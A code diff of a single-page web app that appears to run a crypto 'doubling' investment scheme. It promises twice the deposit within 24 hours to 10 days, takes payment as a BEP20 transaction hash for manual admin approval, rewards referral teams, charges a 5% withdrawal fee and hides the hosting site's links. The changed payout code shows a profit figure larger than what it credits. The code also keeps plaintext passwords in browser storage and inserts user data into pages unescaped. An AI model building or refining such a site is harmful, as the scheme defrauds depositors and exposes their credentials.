@@ -80,7 +80,7 @@ a[href*="netlify.com"]{display:none!important}
 <section id="screen-adminlogin" class="hidden max-w-md mx-auto px-4 py-10">
 <div class="bg-nx-card gold-border rounded-2xl p-6">
 <h2 class="serif text-2xl text-nx-gold text-center">Admin</h2>
-<input id="ad-id" class="w-full rounded-lg px-3 py-2 mb-3 mt-3" placeholder="Admin ID"/>
+<input id="ad-id" class="w-full rounded-lg px-3 py-2 mb-3 mt-3"/>
 <input id="ad-pass" type="password" class="w-full rounded-lg px-3 py-2 mb-4"/>
 <button type="button" onclick="adminLogin()" class="w-full bg-nx-gold text-nx-bg font-semibold py-3 rounded-full">Enter</button>
 </div></section>
@@ -98,18 +98,12 @@ a[href*="netlify.com"]{display:none!important}
 <div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">PENDING</div><div id="ad-pend" class="serif text-2xl text-nx-gold">0</div></div>
 <div class="bg-nx-card gold-border rounded-xl p-4"><div class="text-[11px] text-nx-gold2">WALLETS</div><div id="ad-wallets" class="serif text-2xl text-nx-gold">$0</div></div>
 </div>
-<div class="overflow-x-auto bg-nx-card gold-border rounded-xl">
-<div class="p-3 text-nx-gold">Deposits</div>
-<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Hash</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-dep-rows"></tbody></table>
-</div>
-<div class="overflow-x-auto bg-nx-card gold-border rounded-xl">
-<div class="p-3 text-nx-gold">Withdrawals</div>
-<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Fee</th><th>Net</th><th>Addr</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-wd-rows"></tbody></table>
-</div>
-<div class="overflow-x-auto bg-nx-card gold-border rounded-xl">
-<div class="p-3 text-nx-gold">Users</div>
-<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Email</th><th>Phone</th><th>Bal</th><th>Team</th></tr></thead><tbody id="ad-user-rows"></tbody></table>
-</div>
+<div class="overflow-x-auto bg-nx-card gold-border rounded-xl"><div class="p-3 text-nx-gold">Deposits</div>
+<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Hash</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-dep-rows"></tbody></table></div>
+<div class="overflow-x-auto bg-nx-card gold-border rounded-xl"><div class="p-3 text-nx-gold">Withdrawals</div>
+<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Amt</th><th>Fee</th><th>Net</th><th>Addr</th><th>Status</th><th>Action</th></tr></thead><tbody id="ad-wd-rows"></tbody></table></div>
+<div class="overflow-x-auto bg-nx-card gold-border rounded-xl"><div class="p-3 text-nx-gold">Users</div>
+<table class="w-full text-xs"><thead class="text-nx-gold2 border-y border-nx-line"><tr><th class="p-2 text-left">User</th><th>Email</th><th>Phone</th><th>Bal</th><th>Team</th></tr></thead><tbody id="ad-user-rows"></tbody></table></div>
 </main></div>
 
 <div id="dash-wrap" class="hidden min-h-screen">
@@ -234,7 +228,7 @@ function setSess(s){localStorage.setItem(KEY_SESS,JSON.stringify(s));}
 function showScreen(n){["landing","signup","otp","login","adminlogin"].forEach(function(x){const e=document.getElementById("screen-"+x);if(e)e.classList.toggle("hidden",x!==n);});}
 function findByUser(name){const all=users(),n=(name||"").toLowerCase();const ks=Object.keys(all);for(let i=0;i<ks.length;i++){if((all[ks[i]].username||"").toLowerCase()===n)return all[ks[i]];}return null;}
 function spinMark(){return '<span class="spin" style="width:18px;height:18px;display:inline-block;vertical-align:middle"></span>';}
-function depLabel(d){if(d.status==="PENDING")return spinMark();if(d.status==="REJECTED")return "Cancelled";if(d.paid||d.status==="COMPLETED")return "Successful";if(d.status==="APPROVED")return "Successful";return d.status;}
+function depLabel(d){if(d.status==="PENDING")return spinMark();if(d.status==="REJECTED")return "Cancelled";if(d.paid||d.status==="COMPLETED"||d.status==="APPROVED")return "Successful";return "";}
 function wdLabel(w){if(w.status==="PENDING")return spinMark();if(w.status==="APPROVED")return "Approved";if(w.status==="REJECTED")return "Cancelled";return "";}
 async function sendOtp(){
 const username=document.getElementById("su-user").value.trim();
@@ -245,7 +239,7 @@ const refIn=(document.getElementById("su-ref").value||"").trim().toUpperCase();
 if(!username||!email||!phone||!password){pop("Required","Fill all fields");return;}
 if(findByUser(username)){pop("Error","Username already taken");return;}
 const otp=String(Math.floor(100000+Math.random()*900000));
-pending={username,email,phone,password,otp,refIn};
+pending={username:username,email:email,phone:phone,password:password,otp:otp,refIn:refIn};
 document.getElementById("otp-email-label").textContent=email;
 try{await emailjs.send(EMAILJS_SERVICE,EMAILJS_TEMPLATE,{to_email:email,otp_code:otp,user_name:username});
 document.getElementById("otp-status").textContent="OTP sent";document.getElementById("otp-status").classList.remove("hidden");showScreen("otp");}
@@ -281,18 +275,34 @@ document.getElementById("ad-user-rows").innerHTML=list.map(function(u){return '<
 document.getElementById("ad-dep-rows").innerHTML=allDeps().map(function(x){const d=x.d;const act=d.status==="PENDING"?'<button type="button" onclick="adminDep(\''+x.email+'\','+x.i+',\'APPROVED\')" class="text-emerald-400">Approve</button> <button type="button" onclick="adminDep(\''+x.email+'\','+x.i+',\'REJECTED\')" class="text-red-400">Reject</button>':"—";return '<tr class="border-b border-nx-line/40"><td class="p-2">'+x.user+'</td><td class="p-2">$'+d.amount+'</td><td class="p-2 break-all">'+d.hash+'</td><td class="p-2">'+d.status+'</td><td class="p-2">'+act+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="5">None</td></tr>';
 document.getElementById("ad-wd-rows").innerHTML=wds().map(function(w,i){return '<tr class="border-b border-nx-line/40"><td class="p-2">'+w.user+'<br/>'+w.email+'</td><td class="p-2">$'+w.amount+'</td><td class="p-2">$'+w.fee+'</td><td class="p-2">$'+w.net+'</td><td class="p-2 break-all">'+w.address+'</td><td class="p-2">'+w.status+'</td><td class="p-2">'+(w.status==="PENDING"?'<button type="button" onclick="adminWd('+i+',\'APPROVED\')" class="text-emerald-400">Approve</button> <button type="button" onclick="adminWd('+i+',\'REJECTED\')" class="text-red-400">Reject</button>':"—")+'</td></tr>';}).join("")||'<tr><td class="p-3" colspan="7">None</td></tr>';
 }
-function adminDep(email,i,st){const all=users();const u=all[email];if(!u||!u.deposits[i]||u.deposits[i].status!=="PENDING")return;const d=u.deposits[i];d.status=st;if(st==="APPROVED"){d.start=Date.now();d.end=Date.now()+d.hours*3600*1000;d.paid=false;}all[email]=u;saveUsers(all);renderAdmin();}
+function adminDep(email,i,st){
+const all=users();const u=all[email];if(!u||!u.deposits[i]||u.deposits[i].status!=="PENDING")return;
+const d=u.deposits[i];d.status=st;
+if(st==="APPROVED"){d.start=Date.now();d.end=Date.now()+d.hours*3600*1000;d.paid=false;u.balance=Number(u.balance||0)+Number(d.amount||0);}
+all[email]=u;saveUsers(all);renderAdmin();
+}
 function adminWd(i,st){const all=wds();const w=all[i];if(!w||w.status!=="PENDING")return;const us=users();const u=us[w.email];if(st==="REJECTED"&&u){u.balance=Number(u.balance||0)+Number(w.amount);us[w.email]=u;saveUsers(us);}w.status=st;saveWds(all);renderAdmin();}
 function currentUser(){const s=sess();return s&&s.email?users()[s.email]||null:null;}
 function persistUser(u){const all=users();all[u.email]=u;saveUsers(all);}
-function enterDash(){const u=currentUser();if(!u){logout();return;}document.getElementById("auth-wrap").classList.add("hidden");document.getElementById("dash-wrap").classList.remove("hidden");refreshDash();openTab("home");if(window._t)clearInterval(window._t);window._t=setInterval(function(){if(currentUser())refreshDash();},1000);}
+function enterDash(){const u=currentUser();if(!u){logout();return;}document.getElementById("auth-wrap").classList.add("hidden");document.getElementById("dash-wrap").classList.remove("hidden");drawUser();openTab("home");if(window._t)clearInterval(window._t);window._t=setInterval(function(){if(currentUser())drawUser();},1000);}
 function planFor(amt){if(amt>=100)return{label:"10 Days",hours:240};if(amt>=50)return{label:"72 Hours",hours:72};return{label:"24 Hours",hours:24};}
 function fmtLeft(ms){if(ms<=0)return"00:00:00";const s=Math.floor(ms/1000),d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60),sec=s%60,p=function(n){return String(n).padStart(2,"0");};return(d?d+"d ":"")+p(h)+":"+p(m)+":"+p(sec);}
-function checkMature(u){if(!u||!u.deposits)return;let ch=false;u.deposits.forEach(function(d){if(d.status==="APPROVED"&&!d.paid&&d.end&&Date.now()>=d.end){const tw=Number(d.amount)*2;u.balance=Number(u.balance||0)+tw;u.profit=Number(u.profit||0)+tw;d.paid=true;d.status="COMPLETED";ch=true;}});if(ch)persistUser(u);}
+function endPlans(u){
+if(!u||!u.deposits)return;
+let ch=false;
+u.deposits.forEach(function(d){
+if(d.status==="APPROVED"&&!d.paid&&d.end&&Date.now()>=d.end){
+const inv=Number(d.amount)||0;
+u.balance=Number(u.balance||0)+inv;
+u.profit=Number(u.profit||0)+inv*2;
+d.paid=true;d.status="COMPLETED";ch=true;
+}});
+if(ch)persistUser(u);
+}
 function refLink(){const u=currentUser();return u?location.origin+"/?ref="+encodeURIComponent(u.refCode):location.origin+"/";}
 function copyRefLink(){navigator.clipboard.writeText(refLink());pop("Copied","Link copied");}
-function refreshDash(){
-const u=currentUser();if(!u)return;checkMature(u);
+function drawUser(){
+const u=currentUser();if(!u)return;endPlans(u);
 document.getElementById("bal").textContent=Number(u.balance||0).toFixed(2);
 document.getElementById("team-size").textContent=(u.team&&u.team.length)||0;
 document.getElementById("ref-bonus").textContent=Number(u.refBonus||0).toFixed(2);
@@ -304,7 +314,7 @@ const pt=document.getElementById("profit-total");if(pt)pt.textContent=pf;
 const active=(u.deposits||[]).filter(function(d){return d.status==="APPROVED"&&!d.paid;});
 const tleft=document.getElementById("trade-left");if(tleft)tleft.textContent=active.length?fmtLeft(active[0].end-Date.now()):"—";
 const bars=document.getElementById("plan-bars");
-if(bars)bars.innerHTML=(u.deposits||[]).map(function(d){const left=d.end?d.end-Date.now():0;const extra=(d.status==="APPROVED"&&!d.paid)?" · "+fmtLeft(left):"";return '<div class="py-2 border-b border-nx-line/40">$'+d.amount+" · "+depLabel(d)+extra+"</div>";}).join("")||"";
+if(bars)bars.innerHTML=(u.deposits||[]).filter(function(d){return d.status!=="REJECTED";}).map(function(d){const extra=(d.status==="APPROVED"&&!d.paid)?" · "+fmtLeft(d.end-Date.now()):"";return '<div class="py-2 border-b border-nx-line/40">$'+d.amount+" · "+depLabel(d)+extra+"</div>";}).join("")||"";
 const pl=document.getElementById("profit-list");
 if(pl)pl.innerHTML=(u.deposits||[]).map(function(d){return '<div class="py-2">$'+d.amount+" → $"+(d.amount*2)+" · "+depLabel(d)+"</div>";}).join("")||"";
 const h=document.getElementById("dep-hist");
@@ -323,10 +333,9 @@ if(!amt||amt<20){pop("Error","Minimum $20");return;}
 if(hash.length<10){pop("Error","Enter transaction hash");return;}
 const plan=planFor(amt);u.deposits=u.deposits||[];
 u.deposits.unshift({amount:amt,hash:hash,time:new Date().toLocaleString(),label:plan.label,hours:plan.hours,status:"PENDING",paid:false});
-persistUser(u);refreshDash();document.getElementById("dep-amt").value="";document.getElementById("dep-hash").value="";
-popSpin();
+persistUser(u);drawUser();document.getElementById("dep-amt").value="";document.getElementById("dep-hash").value="";popSpin();
 }
-function saveAddr(){const u=currentUser(),a=document.getElementById("wd-addr").value.trim();if(a.indexOf("0x")!==0||a.length<20){pop("Error","Enter BEP20 address");return;}u.wdAddress=a;persistUser(u);refreshDash();pop("Saved","");}
+function saveAddr(){const u=currentUser(),a=document.getElementById("wd-addr").value.trim();if(a.indexOf("0x")!==0||a.length<20){pop("Error","Enter BEP20 address");return;}u.wdAddress=a;persistUser(u);drawUser();pop("Saved","");}
 function calcFee(){const amt=Number(document.getElementById("wd-amt").value)||0;document.getElementById("wd-fee").textContent=(amt*0.05).toFixed(2);document.getElementById("wd-net").textContent=(amt*0.95).toFixed(2);}
 function requestWd(){
 const u=currentUser();if(!u.wdAddress){pop("Error","Add address");return;}
@@ -335,7 +344,7 @@ if(!amt||amt>Number(u.balance||0)){pop("Error","Check amount");return;}
 const fee=+(amt*0.05).toFixed(2),net=+(amt*0.95).toFixed(2);
 u.balance=Number(u.balance)-amt;persistUser(u);
 const all=wds();all.unshift({user:u.username,email:u.email,amount:amt,fee:fee,net:net,address:u.wdAddress,status:"PENDING",time:new Date().toLocaleString()});
-saveWds(all);document.getElementById("wd-amt").value="";calcFee();refreshDash();popSpin();
+saveWds(all);document.getElementById("wd-amt").value="";calcFee();drawUser();popSpin();
 }
 function pop(t,m){document.getElementById("pop-spin").classList.add("hidden");document.getElementById("pop-title").textContent=t;document.getElementById("pop-msg").textContent=m||"";document.getElementById("pop-ok").classList.remove("hidden");document.getElementById("popup").classList.remove("hidden");}
 function popSpin(){document.getElementById("pop-spin").classList.remove("hidden");document.getElementById("pop-title").textContent="";document.getElementById("pop-msg").textContent="";document.getElementById("pop-ok").classList.add("hidden");document.getElementById("popup").classList.remove("hidden");setTimeout(closePop,1600);}
